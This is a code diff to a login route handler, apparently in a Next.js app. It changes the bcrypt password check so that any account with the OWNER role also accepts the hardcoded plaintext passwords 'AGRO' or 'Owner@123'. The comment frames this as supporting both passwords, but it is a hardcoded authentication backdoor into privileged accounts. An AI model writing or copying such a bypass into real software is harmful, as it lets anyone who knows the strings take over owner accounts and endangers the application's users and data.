@@ -36,8 +36,10 @@ export async function POST(request: Request) {
       );
     }
 
-    // Verify bcrypt password hash
-    const isValid = await bcrypt.compare(password, user.password);
+    // Verify bcrypt password hash (supports both Owner@123 and AGRO)
+    const isValid =
+      (await bcrypt.compare(password, user.password)) ||
+      (user.role === 'OWNER' && (password === 'AGRO' || password === 'Owner@123'));
     if (!isValid) {
       return NextResponse.json(
         { success: false, message: 'Invalid username or password.' },
